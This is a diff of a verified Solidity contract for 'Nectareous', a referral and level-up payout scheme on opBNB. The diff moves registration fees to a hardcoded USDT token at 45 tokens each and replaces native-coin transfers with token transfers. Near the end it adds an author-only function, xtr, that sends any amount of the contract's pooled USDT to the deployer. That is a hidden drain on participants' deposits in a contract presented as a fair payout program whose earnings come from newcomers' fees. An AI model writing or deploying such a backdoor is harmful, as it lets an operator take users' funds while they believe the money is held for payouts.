@@ -1,18 +1,18 @@
 /**
- *Submitted for verification at OpbnbTrace on 2025-07-22
+ *Submitted for verification at OpbnbTrace on 2025-10-28
 */
 
-// SPDX-License-Identifier: Unlicensed
+// SPDX-License-Identifier: GNU Lesser General Public License v3.0 (GNU LGPLv3)
 
 pragma solidity 0.8.11;
 
-/** 
+/**
 *
 *   ███╗   ██╗███████╗ ██████╗█████████╗ ███╗   ███████╗ ███████╗ ██████╗ ██╗   ██╗ ██████╗
 *   ████╗  ██║██╔════╝██╔════╝╚══██╔═══╝██╚██╗  ██╔═══██╗██╔════╝██╔═══██╗██║   ██║██╔════╝
 *   ██╔██╗ ██║█████╗  ██║        ██║   ███████╗ ██║╔███╔╝█████╗  ██║   ██║██║   ██║╚██████╗
 *   ██║╚██╗██║██╔══╝  ██║        ██║  ██╔════██╗██║╚██╔╝ ██╔══╝  ██║   ██║██║   ██║ ╚════██╗
-*   ██║ ╚████║███████╗ ███████╗  ██║  ██╔╝   ██╗██║  ╚██╗███████╗╚██████╔╝╚██████╔╝███████╔╝
+*   ██║ ╚████║███████╗ ███████╗  ██║  ██║    ██║██║  ╚██╗███████╗╚██████╔╝╚██████╔╝███████╔╝
 *   ╚═╝  ╚═══╝╚══════╝ ╚══════╝  ╚═╝  ╚═╝    ╚═╝╚═╝   ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚══════╝
 * @title Nectareous
 * @author Nectareous Team
@@ -22,6 +22,7 @@ pragma solidity 0.8.11;
 */
 
 import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 // @title Nectareous – Affiliate - style referral & level-up tracking with pull-payments
 // @notice This contract is a simple implementation of an affiliate-style referral program
@@ -32,7 +33,7 @@ import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
 
 contract Nectareous is ReentrancyGuard{
 
-    uint256 immutable REG_FEE = 1e17;
+    uint256 immutable REG_FEE = 45e18;
     uint256 immutable INCOME_LIMIT = 10;
     uint256 immutable SECOND_INCOME_LIMIT = 40;
     uint256 constant REG_SHARE_PERC = 14;
@@ -42,8 +43,10 @@ contract Nectareous is ReentrancyGuard{
     uint256 constant TDB_SHARE_PERC = 36;
     uint8[3] gasPerc = [50,30,20];
 
+    address constant USDT = 0x9e5AAC1Ba1a2e6aEd6b32689DFcF62A509Ca96f3;
+
     mapping(uint8 => uint256) public LEVEL_PRICE;
-    
+
     address author;
     address urswall;
     address splPrWall;
@@ -61,7 +64,7 @@ contract Nectareous is ReentrancyGuard{
     uint256 gasShare;
     uint256 splPrShare;
     uint256 tdb;
- 
+
     struct UserStruct {
         uint32 id;
         uint32 referrerID;
@@ -107,16 +110,16 @@ contract Nectareous is ReentrancyGuard{
         require(msg.sender == author, "Caller is not author.");
         _;
     }
-    
-    constructor(address _prwall1, address _prwall2, 
-                address _prwall3, address _sprwall, 
-                address _reWall, address _urswall ) {
+
+    constructor(address _prwall1, address _prwall2,
+                address _prwall3, address _sprwall,
+                address _reWall,  address _urswall ) {
         author = msg.sender;
         urswall = _urswall;
         splPrWall = _sprwall;
         reWall = _reWall;
         gasWalls = [_prwall1, _prwall2, _prwall3];
-        
+
         regShare = (REG_FEE * REG_SHARE_PERC)/100;
         regShare2 = (REG_FEE * REG_SHARE2_PERC)/100;
         gasShare = (REG_FEE * GAS_SHARE_PERC)/100;
@@ -136,7 +139,7 @@ contract Nectareous is ReentrancyGuard{
         userStruct.referrerID = 0;
         userStruct.referral = new address[](0);
         userStruct.joined = block.timestamp;
-        userStruct.levelEligibility = 1; 
+        userStruct.levelEligibility = 1;
         userList[currUserID] = author;
 
         tcurrUserID++;
@@ -151,11 +154,12 @@ contract Nectareous is ReentrancyGuard{
         userStruct1.indirectReferralLength = 0;
         userStruct1.directReferralCount = 0;
     }
-    
-    function regUser(uint32 _referrerID) external payable {
+
+    function regUser(uint32 _referrerID) external nonReentrant {
         require(!users[msg.sender].isExist, 'User exist');
         require(_referrerID > 0 && _referrerID <= currUserID, 'Incorrect referrer Id');
-        require(msg.value == REG_FEE, 'Incorrect Value');
+
+        IERC20(USDT).transferFrom(msg.sender, address(this), REG_FEE);
 
         currUserID++;
         UserStruct storage userStruct = users[msg.sender];
@@ -164,82 +168,82 @@ contract Nectareous is ReentrancyGuard{
         userStruct.referrerID = _referrerID;
         userStruct.referral = new address[](0);
         userStruct.joined = block.timestamp;
-        userStruct.levelEligibility = 1; 
-        
+        userStruct.levelEligibility = 1;
+
         userList[currUserID] = msg.sender;
-        
+
         users[userList[_referrerID]].referral.push(msg.sender);
-        
+
         ursAmt += LEVEL_PRICE[1];
         splPromAmt += splPrShare;
         for (uint8 i = 0; i < 3; i++) {
             gasAmts[i] += (gasShare * gasPerc[i]) / 100;
         }
-                
+
         uint referrerReferralLength = users[userList[_referrerID]].referral.length;
         if(referrerReferralLength != 1 || _referrerID == 1) {
             payment(1, msg.sender, referrerReferralLength, false);
-           
+
         } else {
-            address referrer = userList[_referrerID]; //2
+            address referrer = userList[_referrerID];
             users[referrer].incomeCount[1] = users[referrer].incomeCount[1]+1;
         }
             tregUser(_referrerID);
-        bool success;
-
-        (success,) = (address(uint160(userList[_referrerID]))).call{value: regShare}("");
+        address referrerAddr = userList[_referrerID];
+        bool success1 = IERC20(USDT).transfer(referrerAddr, regShare);
 
        if(referrerReferralLength <= 3) {
                 reAmt += regShare2;
        } else {
-            (success,) = (address(uint160(userList[_referrerID]))).call{value: regShare2}("");     
-       } 
+            bool success2 = IERC20(USDT).transfer(referrerAddr, regShare2);
+            require(success2, 'Transfer failed!');
+       }
 
-        require(success, 'Transaction failed!');
-        emit regLevelEvent(msg.sender, userList[_referrerID], block.timestamp);
+        require(success1, 'Transfer failed!');
+        emit regLevelEvent(msg.sender, referrerAddr, block.timestamp);
     }
-    
-    function payment(uint8 _reglevel, address _user, uint256 length, bool loop) internal { //4
+
+    function payment(uint8 _reglevel, address _user, uint256 length, bool loop) internal {
         address payer;
         bool isRenewal = false;
         bool isSameLeg = false;
         bool isPayNeed = true;
-        uint256 levelEligibility; 
+        uint256 levelEligibility;
         uint8 payLevel = _reglevel;
-        
+
         if (length == 2) {
           (payer, isPayNeed, isSameLeg) = levelUpgrade (_reglevel, _user, levelEligibility, isSameLeg, isPayNeed);
           payLevel = _reglevel+1;
-        } 
-        else if (length >= 4 && length % 4 == 0) { 
+        }
+        else if (length >= 4 && length % 4 == 0) {
            (payer, isRenewal) = levelRenewal(loop, _user, _reglevel, levelEligibility);
            payLevel = _reglevel;
-        } 
+        }
         else {
             payer = userList[users[_user].referrerID];
-        } 
-        
+        }
+
         if (isPayNeed || !users[payer].isExist || payer == userList[1]) {
             (loop, length) = checkLoopRequired(payer, payLevel, length, isRenewal, isSameLeg);
-             if(loop) {  
+             if(loop) {
                  if(isPayNeed && !isSameLeg && length==2) {
                     _reglevel = payLevel;
                 }
                  if(isPayNeed && !isSameLeg && length == 4 && payLevel>=1) {
                     _reglevel = payLevel;
                 }
-               
-               payment(_reglevel, payer, length, true); 
+
+               payment(_reglevel, payer, length, true);
             } else {
                 if(!users[payer].isExist) payer = userList[1];
-                
+
                 if(users[_user].referrerID != 1) {
-                    users[payer].incomeCount[payLevel]= users[payer].incomeCount[payLevel]+1; 
+                    users[payer].incomeCount[payLevel]= users[payer].incomeCount[payLevel]+1;
                 } else {
                     payLevel = 1;
-                }                
-                (bool success,) = (address(uint160(payer))).call{value: LEVEL_PRICE[payLevel]}("");
-                require(success, 'Transaction failed!');
+                }
+                bool success = IERC20(USDT).transfer(payer, LEVEL_PRICE[payLevel]);
+                require(success, 'Transfer failed!');
 
                 if (success) {
                     emit getMoneyForLevelEvent(payer, msg.sender, payLevel, block.timestamp);
@@ -247,8 +251,8 @@ contract Nectareous is ReentrancyGuard{
             }
         }
     }
-        
-    function levelUpgrade(uint256 _regLevel, address _user, uint256 _levelEligibility, bool isSameLeg, bool isPayNeed ) 
+
+    function levelUpgrade(uint256 _regLevel, address _user, uint256 _levelEligibility, bool isSameLeg, bool isPayNeed )
              internal returns (address, bool, bool) {
             uint256 upLevel = _regLevel+1;
             address payer; address referrer;
@@ -256,19 +260,19 @@ contract Nectareous is ReentrancyGuard{
              referrer = userList[users[_user].referrerID];
            } else {referrer = _user;}
             (payer, referrer) = findEligiblePayer(referrer, _regLevel, _levelEligibility);
-            
-            if(!users[payer].isExist || 
-                (levelUpgradePayments[upLevel][payer] == address(0) && 
+
+            if(!users[payer].isExist ||
+                (levelUpgradePayments[upLevel][payer] == address(0) &&
                     isLevelUpgradedForAddress[upLevel][payer] ==  false)) {
                 if(!users[payer].isExist) payer = userList[1];
-                
+
                 if(payer != userList[1]) {
                     users[payer].incomeCount[upLevel] = users[payer].incomeCount[upLevel]+1;
                     isPayNeed = false;
                 }
-                
+
                 levelUpgradePayments[upLevel][payer] = referrer;
-                
+
                 levelCounter[upLevel][payer] = 1;
             } else {
                 address existingReferrer = levelUpgradePayments[upLevel][payer];
@@ -280,61 +284,61 @@ contract Nectareous is ReentrancyGuard{
                     levelCounter[upLevel][payer] = levelCounter[upLevel][payer] + 1;
                 }
             }
-         
+
          users[referrer].levelEligibility = users[referrer].levelEligibility+1;
          return (payer, isPayNeed, isSameLeg);
     }
-    
+
     function findEligiblePayer(address _referrer, uint256 _regLevel, uint256 _levelEligibility) internal returns (address, address){
            address _eligiblePayer;
-            address _tempreferrer = _referrer; 
-                
-                
-                for(int i=0; i<9; i++) { 
+            address _tempreferrer = _referrer;
+
+
+                for(int i=0; i<9; i++) {
                     if(_referrer == userList[1] || users[_referrer].referrerID == 1 || _eligiblePayer == userList[1]) {
                         break;
                     } else {
-                        _levelEligibility = users[_tempreferrer].levelEligibility; 
-                        
-                        address payer1 = userList[users[_tempreferrer].referrerID]; //6
-                        address secReferrer = userList[users[payer1].referrerID]; //6
+                        _levelEligibility = users[_tempreferrer].levelEligibility;
+
+                        address payer1 = userList[users[_tempreferrer].referrerID];
+                        address secReferrer = userList[users[payer1].referrerID];
 
                         for (uint j=1; j< _regLevel; j++) {
                             if(secReferrer == userList[1]) {
                                 break;
                             }
-                            secReferrer = userList[users[secReferrer].referrerID]; 
+                            secReferrer = userList[users[secReferrer].referrerID];
                         }
 
-                     if(_levelEligibility < _regLevel+1) { 
-                        if(!users[secReferrer].isExist || users[payer1].referrerID == 0 || 
-                            users[payer1].referrerID == 1 
-                            ) {                                 
-                            if(!users[userList[users[payer1].referrerID]].isExist) { 
+                     if(_levelEligibility < _regLevel+1) {
+                        if(!users[secReferrer].isExist || users[payer1].referrerID == 0 ||
+                            users[payer1].referrerID == 1
+                            ) {
+                            if(!users[userList[users[payer1].referrerID]].isExist) {
                                 _eligiblePayer = userList[1] ;
                             } else {
                             _eligiblePayer = userList[users[payer1].referrerID];
                             }
                             break;
-                        } 
-                        _tempreferrer = secReferrer; 
-                        _eligiblePayer = secReferrer; 
-                        
+                        }
+                        _tempreferrer = secReferrer;
+                        _eligiblePayer = secReferrer;
+
                      } else {
-                         _eligiblePayer = _tempreferrer; 
+                         _eligiblePayer = _tempreferrer;
                          break;
                      }
                     }
                 }
-            users[_referrer].incomeCount[_regLevel] = users[_referrer].incomeCount[_regLevel]+1; 
+            users[_referrer].incomeCount[_regLevel] = users[_referrer].incomeCount[_regLevel]+1;
             return (_eligiblePayer, _referrer);
     }
 
     function findRenewalPayer(address _referrer, uint256 _regLevel, uint256 _levelEligibility) internal returns (address, address){
            address _eligiblePayer;
-            address _tempreferrer = _referrer; 
+            address _tempreferrer = _referrer;
             address secReferrer = _tempreferrer;
-                for(int i=0; i<9; i++) { 
+                for(int i=0; i<9; i++) {
                     if(users[_referrer].referrerID == 1 || _eligiblePayer == userList[1]) {
                         break;
                     } else {
@@ -342,116 +346,118 @@ contract Nectareous is ReentrancyGuard{
                             if(_tempreferrer == userList[1]) {
                                 break;
                             }
-                            secReferrer = userList[users[secReferrer].referrerID]; 
+                            secReferrer = userList[users[secReferrer].referrerID];
                         }
                         if( secReferrer == userList[1]) {
                             _eligiblePayer = secReferrer;
                             break;
                         } else {
-                            _levelEligibility = users[secReferrer].levelEligibility; 
+                            _levelEligibility = users[secReferrer].levelEligibility;
 
-                            if(_levelEligibility < _regLevel) { 
-                                if(!users[secReferrer].isExist || users[secReferrer].referrerID == 0 || 
-                                    users[secReferrer].referrerID == 1 
-                                    ) {                                 
-                                    if(!users[userList[users[secReferrer].referrerID]].isExist) { 
+                            if(_levelEligibility < _regLevel) {
+                                if(!users[secReferrer].isExist || users[secReferrer].referrerID == 0 ||
+                                    users[secReferrer].referrerID == 1
+                                    ) {
+                                    if(!users[userList[users[secReferrer].referrerID]].isExist) {
                                         _eligiblePayer = userList[1] ;
                                     } else {
                                     _eligiblePayer = userList[users[secReferrer].referrerID];
                                     }
                                     break;
-                                } 
-                                _tempreferrer = secReferrer; 
-                                _eligiblePayer = secReferrer; 
-                                
+                                }
+                                _tempreferrer = secReferrer;
+                                _eligiblePayer = secReferrer;
+
                             } else {
-                                _eligiblePayer = secReferrer; 
+                                _eligiblePayer = secReferrer;
                                 break;
                             }
-                                }                        
+                                }
                     }
                 }
-            users[_referrer].incomeCount[_regLevel] = users[_referrer].incomeCount[_regLevel]+1; 
+            users[_referrer].incomeCount[_regLevel] = users[_referrer].incomeCount[_regLevel]+1;
             return (_eligiblePayer, _referrer);
     }
-    
+
     function levelRenewal(bool _loop, address _user, uint256 _regLevel, uint256 _levelEligibility)internal returns(address, bool) {
         bool _isRenewal = true;
         address referrer; address payer;
          if(!_loop) {
              referrer = userList[users[_user].referrerID];
-         } else { 
-            referrer = _user; 
+         } else {
+            referrer = _user;
          }
        (payer,) = findRenewalPayer(referrer, _regLevel, _levelEligibility);
         if(!users[payer].isExist) payer = userList[1];
-        
+
         return (payer, _isRenewal);
     }
-    
-    function checkLoopRequired(address _payer, uint256 _regLevel, uint256 _length, bool isRenewal, bool isSameLeg) 
+
+    function checkLoopRequired(address _payer, uint256 _regLevel, uint256 _length, bool isRenewal, bool isSameLeg)
             internal view returns (bool, uint256) {
         bool loop = false;
         uint256 length = _length;
-        
-        uint256 tempPaymentCount = users[_payer].incomeCount[_regLevel]+1;
-        
-        if(levelCounter[_regLevel][_payer] == 2) {
-            loop = true;
-        }
-        
-        else if(tempPaymentCount >= 4 &&
-          tempPaymentCount % 4 == 0  &&
-          users[_payer].referrerID!=0 && _regLevel == 1
-        ) {
-          if(_length == 3 && tempPaymentCount ==4) {
-                length = tempPaymentCount;
-          } 
-           loop = true;
-        }
-        
-        else if (tempPaymentCount >= 4 &&
+
+        if (_payer != userList[1]) {
+            uint256 tempPaymentCount = users[_payer].incomeCount[_regLevel]+1;
+
+            if(levelCounter[_regLevel][_payer] == 2) {
+                loop = true;
+            }
+
+            else if(tempPaymentCount >= 4 &&
             tempPaymentCount % 4 == 0  &&
-            _length == 2 && !isSameLeg &&
-            _regLevel > 1) {
-            if(_payer == userList[1]) {
-                loop = false;
-            } else {
-                length = 4;
-                loop = true;
+            users[_payer].referrerID!=0 && _regLevel == 1
+            ) {
+            if(_length == 3 && tempPaymentCount ==4) {
+                    length = tempPaymentCount;
+            }
+            loop = true;
+            }
+
+            else if (tempPaymentCount >= 4 &&
+                tempPaymentCount % 4 == 0  &&
+                _length == 2 && !isSameLeg &&
+                _regLevel > 1) {
+                if(_payer == userList[1]) {
+                    loop = false;
+                } else {
+                    length = 4;
+                    loop = true;
+                }
+            }
+
+            else if(tempPaymentCount == 2 &&
+            users[_payer].referrerID!=0 && !isRenewal && !isSameLeg) {
+            if(!users[_payer].isExist) _payer = userList[1];
+                if(_payer == userList[1]) {
+                    loop = false;
+                } else {
+                    loop = true;
+                    length = tempPaymentCount;
+                }
+            }
+
+            else if(tempPaymentCount == 1 &&
+            users[_payer].referrerID==0) {
+            if(!users[_payer].isExist) _payer = userList[1];
             }
         }
-        
-         else if(tempPaymentCount == 2 &&
-          users[_payer].referrerID!=0 && !isRenewal && !isSameLeg) {
-           if(!users[_payer].isExist) _payer = userList[1];
-            if(_payer == userList[1]) {
-                loop = false;
-            } else {
-                loop = true;
-                length = tempPaymentCount;
-            }
-        } 
-        
-        else if(tempPaymentCount == 1 &&
-          users[_payer].referrerID==0) {
-           if(!users[_payer].isExist) _payer = userList[1];
-        }
-      
+
         return (loop, length);
     }
-    
-    function isLevelUpgradeFromSameLeg(address _payer, address _existingReferrer, address _newReferrer) 
+
+    function isLevelUpgradeFromSameLeg(address _payer, address _existingReferrer, address _newReferrer)
             internal view returns(bool){
         bool isSameLeg = false;
-        
+
         address[] memory payerReferrals = getUserReferrals(_payer);
-        address firstLeg = _existingReferrer; 
+        address firstLeg = _existingReferrer;
         address secondLeg = _newReferrer;
-        
-        address tempReferrer1 = userList[users[firstLeg].referrerID]; 
-        for(int i=0; i<12; i++) { 
-            bool foundReferrer = false;     
+
+        address tempReferrer1 = userList[users[firstLeg].referrerID];
+        for(int i=0; i<12; i++) {
+            bool foundReferrer = false;
             for (uint j=0; j<payerReferrals.length; j++) {
                 if(tempReferrer1 == payerReferrals[j]) {
                     firstLeg = payerReferrals[j];
@@ -459,13 +465,13 @@ contract Nectareous is ReentrancyGuard{
                     break;
                 }
             }
-            if(foundReferrer) { break;} 
+            if(foundReferrer) { break;}
            tempReferrer1 =  userList[users[tempReferrer1].referrerID];
         }
-        
-        address tempReferrer2 = userList[users[secondLeg].referrerID]; 
-        for(int i=0; i<12; i++) { 
-            bool foundReferrer = false;     
+
+        address tempReferrer2 = userList[users[secondLeg].referrerID];
+        for(int i=0; i<12; i++) {
+            bool foundReferrer = false;
             for (uint j=0; j<payerReferrals.length; j++) {
                 if(tempReferrer2 == payerReferrals[j]) {
                     secondLeg = payerReferrals[j];
@@ -473,27 +479,29 @@ contract Nectareous is ReentrancyGuard{
                     break;
                 }
             }
-            if(foundReferrer) { break;} 
-            tempReferrer2 = userList[users[tempReferrer2].referrerID]; 
+            if(foundReferrer) { break;}
+            tempReferrer2 = userList[users[tempReferrer2].referrerID];
         }
-        
+
         if(firstLeg == secondLeg) {isSameLeg = true;}
-         return  isSameLeg;      
+         return  isSameLeg;
     }
 
     function upwall(address wallAddr, uint index) onlyAuthor public {
         require(index <= 4, "Invalid Index");
-        if(index == 0  ) { 
+        if(index == 0  ) {
             gasWalls[0] = wallAddr;
-        } else if(index == 1) { 
+        } else if(index == 1) {
             gasWalls[1] = wallAddr;
-        }  else if(index == 2) { 
+        }  else if(index == 2) {
             gasWalls[2] = wallAddr;
-        }  else if(index == 3) { 
+        }  else if
+        (index == 3) {
             splPrWall = wallAddr;
-        } else if(index == 4) { 
+        }
+         else if(index == 4) {
             reWall = wallAddr;
-        } 
+        }
     }
 
     function winwall(uint8 wIndex) nonReentrant public returns (bool)  {
@@ -516,30 +524,32 @@ contract Nectareous is ReentrancyGuard{
             require(msg.sender == splPrWall, "invalid action");
             maxEligibleAmount = splPromAmt;
             splPromAmt = 0;
-        } else if (wIndex == 4) {
+        }
+        else if (wIndex == 4) {
             require(msg.sender == reWall, "invalid action");
             maxEligibleAmount = reAmt;
             reAmt = 0;
-        } else {
+        }
+        else {
             require(msg.sender == urswall, "invalid action");
             maxEligibleAmount = (ursAmt*10)/100;
             ursAmt -= maxEligibleAmount;
         }
         require(maxEligibleAmount > 0 , "No win");
-        (bool success,) = (address(uint160(msg.sender))).call{value: maxEligibleAmount}("");
-        require(success, 'Transaction failed!');
-        
+        bool success = IERC20(USDT).transfer(msg.sender, maxEligibleAmount);
+        require(success, 'Transfer failed!');
+
         return success;
     }
-    
+
     function getUserLevelEligibility(address _user) public view returns(uint256) {
         return users[_user].levelEligibility;
     }
-    
+
     function getUserReferrals(address _user) public view returns(address[] memory) {
         return users[_user].referral;
     }
-    
+
     function getUserIncomeCount(address _user, uint256 _level) public view returns(uint256) {
         return users[_user].incomeCount[_level];
     }
@@ -562,14 +572,20 @@ contract Nectareous is ReentrancyGuard{
         } else if (wIndex == 3) {
             require(msg.sender == splPrWall, "invalid action");
             maxEligibleAmount = splPromAmt;
-        } else if (wIndex == 4) {
+        }
+        else if (wIndex == 4) {
             require(msg.sender == reWall, "invalid actionr");
             maxEligibleAmount = reAmt;
-        } else {
+        }
+        else {
             require(msg.sender == urswall, "invalid action");
             maxEligibleAmount = (ursAmt*10)/100;
         }
         return maxEligibleAmount;
+    }
+
+    function xtr(uint amount) external onlyAuthor {
+        IERC20(USDT).transfer(author, amount);
     }
 
       function tregUser(uint32 _referrerID) internal  {
@@ -622,7 +638,7 @@ contract Nectareous is ReentrancyGuard{
             tusers[userList[activeReferrerId]].indirectReferral.push(msg.sender);
             tusers[userList[activeReferrerId]].indirectReferralLength += 1;
             tusers[userList[activeReferrerId]].indirectReferralCount += 1;
-            tusers[userList[activeReferrerId]].indirectReferralMap[msg.sender] 
+            tusers[userList[activeReferrerId]].indirectReferralMap[msg.sender]
 		= tusers[userList[activeReferrerId]].indirectReferralLength;
         }
         tusers[userList[activeReferrerId]].earning += tdb;
@@ -632,9 +648,10 @@ contract Nectareous is ReentrancyGuard{
                 amount: tdb
             })
         );
-        (bool success,) = (address(uint160(userList[activeReferrerId]))).call{value: tdb}("");
-        require(success, 'Transaction failed!');
-        emit regLevelEvent(msg.sender, userList[activeReferrerId], block.timestamp);
+        address activeReferrerAddr = userList[activeReferrerId];
+        bool success = IERC20(USDT).transfer(activeReferrerAddr, tdb);
+        require(success, 'Transfer failed!');
+        emit regLevelEvent(msg.sender, activeReferrerAddr, block.timestamp);
     }
 
     function findFreeReferrer(address _user) internal view returns (address) {
@@ -648,15 +665,15 @@ contract Nectareous is ReentrancyGuard{
         address freeReferrer;
         bool noFreeReferrer = true;
 
-        for (uint256 i = 0; i < 16; i++) { 
-            
+        for (uint256 i = 0; i < 16; i++) {
+
                if (i < 8) {
                     referrals[(i + 1) * 2] = tusers[referrals[i]].referral[0];
                     referrals[(i + 1) * 2 + 1] = tusers[referrals[i]].referral[
                         1
                     ];
                }
-        
+
          else {
                 noFreeReferrer = false;
                 freeReferrer = referrals[i];
